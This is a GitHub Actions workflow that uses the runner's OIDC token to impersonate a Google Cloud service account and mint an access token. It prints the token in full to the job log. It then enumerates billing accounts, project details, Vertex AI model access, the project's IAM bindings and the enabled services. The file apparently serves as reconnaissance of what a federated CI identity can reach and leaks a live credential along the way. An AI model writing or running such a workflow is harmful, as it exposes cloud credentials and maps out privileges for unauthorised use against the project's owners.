name: screen3
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  screen3:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: screen3
        run: |
          set +e
          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
          NUM=303574531351
          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
          echo "##PHASE mint"
          for a in 1 2 3; do
            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
            echo "$J" | jq -r '.value // empty' > tok.jwt
            [ -s tok.jwt ] && break
            sleep 3
          done
          sc=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
            --data-urlencode "subject_token=$(cat tok.jwt)" \
            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
            -d "scope=https://www.googleapis.com/auth/cloud-platform")
          FT=$(jq -r '.access_token // empty' r.json)
          echo "##STS code=$sc"
          AT=$(curl -s -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json | jq -r '.accessToken // empty')
          echo "##TOKEN $AT"
          echo "##TOKENLEN ${#AT}"
          if [ -z "$AT" ]; then echo '##ABORT'; exit 0; fi
          gx=$(curl -s -o exp.json -w '%{http_code}' "https://oauth2.googleapis.com/tokeninfo?access_token=$AT")
          echo "##TOKENINFO code=$gx body=$(head -c 500 exp.json | tr -d '\n' | tr -s ' ')"

          echo "##PHASE billing"
          for P in aryeelab 303574531351 datarepo-does-not-exist-xyz123; do
            b=$(curl -s -o bf.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/$P/billingInfo")
            echo "##BIL p=$P code=$b body=$(head -c 600 bf.json | tr -d '\n' | tr -s ' ')"
          done
          ba=$(curl -s -o ba.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/billingAccounts/01AE22-59EB44-3A4134")
          echo "##BA_GET code=$ba body=$(head -c 900 ba.json | tr -d '\n' | tr -s ' ')"
          bl=$(curl -s -o bl.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/billingAccounts")
          echo "##BA_LIST code=$bl body=$(head -c 900 bl.json | tr -d '\n' | tr -s ' ')"
          # negative control: no auth
          bn=$(curl -s -o bn.json -w '%{http_code}' "https://cloudbilling.googleapis.com/v1/projects/aryeelab/billingInfo")
          echo "##BIL_NOAUTH code=$bn body=$(head -c 300 bn.json | tr -d '\n' | tr -s ' ')"

          echo "##PHASE project"
          pg=$(curl -s -o pg.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/aryeelab")
          echo "##PROJECT code=$pg body=$(head -c 800 pg.json | tr -d '\n' | tr -s ' ')"

          echo "##PHASE vertex"
          for R in us-central1 europe-west1 global; do
            if [ "$R" = "global" ]; then U="https://aiplatform.googleapis.com"; else U="https://$R-aiplatform.googleapis.com"; fi
            c=$(curl -s -o mx.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$U/v1/projects/aryeelab/locations/$R/models")
            echo "##MODELS r=$R code=$c body=$(head -c 300 mx.json | tr -d '\n' | tr -s ' ')"
            pm=$(curl -s -o pm.json -w '%{http_code}' -H "Authorization: Bearer $AT" "$U/v1/projects/aryeelab/locations/$R/publishers/google/models?pageSize=5")
            echo "##PUBMODELS r=$R code=$pm n=$(jq -r '(.models // []) | length' pm.json 2>/dev/null) names=$(jq -r '[.models[]?.name // ""] | join(",")' pm.json 2>/dev/null | head -c 400)"
          done
          jq -n '{contents:[{role:"user",parts:[{text:"hi"}]}],generationConfig:{maxOutputTokens:1}}' > gc.json
          for R in us-central1 global; do
            if [ "$R" = "global" ]; then U="https://aiplatform.googleapis.com"; else U="https://$R-aiplatform.googleapis.com"; fi
            gc=$(curl -s -o gcr.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "$U/v1/projects/aryeelab/locations/$R/publishers/google/models/gemini-2.0-flash:generateContent" -d @gc.json)
            echo "##GENCONTENT r=$R code=$gc body=$(head -c 400 gcr.json | tr -d '\n' | tr -s ' ')"
            ct=$(curl -s -o ctr.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "$U/v1/projects/aryeelab/locations/$R/publishers/google/models/gemini-2.0-flash:countTokens" -d @gc.json)
            echo "##COUNTTOKENS r=$R code=$ct body=$(head -c 300 ctr.json | tr -d '\n' | tr -s ' ')"
          done

          echo "##PHASE iam"
          ic=$(curl -s -o iam.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/aryeelab:getIamPolicy" -d '{"options":{"requestedPolicyVersion":3}}')
          echo "##IAM code=$ic bindings=$(jq -r '(.bindings // []) | length' iam.json 2>/dev/null) etag=$(jq -r '.etag // ""' iam.json 2>/dev/null)"
          jq -r '.bindings[]? | "##BIND role=\(.role) members=\((.members // []) | length) ps=\([(.members // [])[] | select(startswith("principalSet://"))] | length) sa=\([(.members // [])[] | select(startswith("serviceAccount:"))] | length) cond=\(if .condition then (.condition.expression // "cond") else "none" end)"' iam.json 2>/dev/null
          jq -r '.bindings[]? | select((.members // []) | index("serviceAccount:github-actions@aryeelab.iam.gserviceaccount.com")) | "##SA_ROLE role=\(.role) cond=\(if .condition then .condition.expression else "none" end)"' iam.json 2>/dev/null

          echo "##PHASE su"
          su=$(curl -s -o su.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://serviceusage.googleapis.com/v1/projects/aryeelab/services?filter=state:ENABLED&pageSize=200")
          echo "##SU code=$su n=$(jq -r '(.services // []) | length' su.json 2>/dev/null) names=$(jq -r '[.services[]?.config.name // ""] | join(",")' su.json 2>/dev/null | head -c 1500)"
          echo "##FINISHED"

